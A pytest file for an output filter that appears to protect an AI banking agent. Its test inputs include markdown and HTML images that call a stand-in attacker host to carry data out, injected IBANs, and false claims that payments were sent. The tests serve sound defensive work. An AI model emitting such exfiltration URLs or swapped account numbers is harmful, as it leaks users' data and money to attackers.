from core.gate import DecisionAction
from core.output_filter import OutputFilterContext, RULE_EXPLANATIONS, filter_answer


def test_f1_removes_markdown_image_with_exfil_url():
    result = filter_answer("Summary. ![remote](https://evil.example/c?d=secret) ![inline](data:image/png;base64,AAAA)", OutputFilterContext())
    assert "![remote]" not in result.text and "![inline]" not in result.text
    assert any(item.rule_id == "F1" for item in result.decisions)


def test_f1_keeps_plain_text_without_active_content():
    result = filter_answer("Your inbox contains three messages.", OutputFilterContext())
    assert result.text == "Your inbox contains three messages."
    assert not any(item.rule_id == "F1" for item in result.decisions)


def test_f1_removes_html_auto_fetch_content():
    result = filter_answer("Hello <img src=\"https://evil.example/x\"> world", OutputFilterContext())
    assert "<img" not in result.text
    assert any(item.rule_id == "F1" for item in result.decisions)


def test_f2_removes_unknown_link_but_keeps_allowlisted_link():
    ctx = OutputFilterContext(trusted_domains={"example.com"})
    result = filter_answer("https://example.com/help and https://evil.example/x", ctx)
    assert "https://example.com/help" in result.text
    assert "https://evil.example/x" not in result.text
    assert any(item.rule_id == "F2" for item in result.decisions)


def test_f3_removes_sensitive_data_from_url_even_if_host_is_allowed():
    ctx = OutputFilterContext(trusted_domains={"example.com"}, sensitive_values={"GB82WEST12345698765432"})
    result = filter_answer("https://example.com/?id=GB82WEST12345698765432", ctx)
    assert "sensitive data" in result.text
    assert any(item.rule_id == "F3" for item in result.decisions)


def test_f4_removes_ungrounded_iban_and_keeps_grounded_amount():
    ctx = OutputFilterContext(user_command="Tell me about my payment of $25", raw_tool_outputs=[{"amount": "$25"}])
    result = filter_answer("Pay GB82WEST12345698765432. The amount was $25.", ctx)
    assert "GB82WEST12345698765432" not in result.text
    assert "$25" in result.text
    assert any(item.rule_id == "F4" for item in result.decisions)


def test_f5_rewrites_false_sent_claim():
    result = filter_answer("I sent the payment successfully.", OutputFilterContext())
    assert "not completed" in result.text
    assert any(item.rule_id == "F5" for item in result.decisions)


def test_f5_keeps_claim_matching_executed_action():
    ctx = OutputFilterContext(executed_calls=["banking.send_money"], action_completed=True)
    result = filter_answer("I sent the payment successfully.", ctx)
    assert result.text == "I sent the payment successfully."
    assert not any(item.rule_id == "F5" for item in result.decisions)


def test_f5_keeps_negative_status_sentences_intact():
    for text in ("No payment was made and no messages were sent.",
                 "I have not sent any emails.", "I haven't transferred any money.",
                 "I sent no messages."):
        result = filter_answer(text, OutputFilterContext())
        assert result.text == text
        assert not any(item.rule_id == "F5" for item in result.decisions)


def test_f5_still_corrects_positive_claim_after_a_negative_clause():
    result = filter_answer("No payment was made, but I sent the email.", OutputFilterContext())
    assert any(item.rule_id == "F5" for item in result.decisions)
    assert ".." not in result.text


def test_iban_filter_preserves_prose_after_grounded_and_unverified_accounts():
    iban = "GB82WEST12345698765432"
    text = f"The message names {iban} and says not to confirm or mention the change."
    result = filter_answer(text, OutputFilterContext(raw_tool_outputs=[{"iban": iban}]))
    assert result.text == text
    result = filter_answer(text, OutputFilterContext())
    assert "and says not to confirm or mention the change." in result.text
    assert iban not in result.text


def test_formatted_iban_filter_preserves_following_prose():
    text = "Pay GB82 WEST 1234 5698 7654 32 and confirm the change."
    result = filter_answer(text, OutputFilterContext())
    assert "GB82" not in result.text
    assert "and confirm the change." in result.text


def test_f6_masks_own_iban_and_password():
    ctx = OutputFilterContext(profile={"iban": "GB82WEST12345698765432"})
    result = filter_answer("Your account is GB82WEST12345698765432. password=hunter2", ctx)
    assert "GB82WEST12345698765432" not in result.text and "hunter2" not in result.text
    assert any(item.rule_id == "F6" for item in result.decisions)


def test_f6_allows_secret_when_user_requested_it():
    ctx = OutputFilterContext(profile={"balance": "$50"}, answer_requested_secrets=True)
    result = filter_answer("Your balance is $50.", ctx)
    assert "$50" in result.text
    assert not any(item.rule_id == "F6" for item in result.decisions)


def test_f6_masks_own_iban_when_only_balance_is_requested():
    ctx = OutputFilterContext(
        profile={"own_iban": "DE89370400440532013000", "balance": "5400"},
        requested_secret_kinds={"balance"},
    )
    result = filter_answer("Balance 5400; IBAN DE89370400440532013000", ctx)
    assert "5400" in result.text
    assert "DE89370400440532013000" not in result.text
    assert any(item.rule_id == "F6" for item in result.decisions)


def test_every_non_allow_rule_has_human_reason_and_hash_is_raw():
    raw = "I sent the transfer"
    result = filter_answer(raw, OutputFilterContext())
    assert result.raw_answer_hash
    assert result.decisions and all(item.action == DecisionAction.BLOCK and item.reason_human for item in result.decisions)
    assert all(item.get("reason_human") for item in RULE_EXPLANATIONS.values())
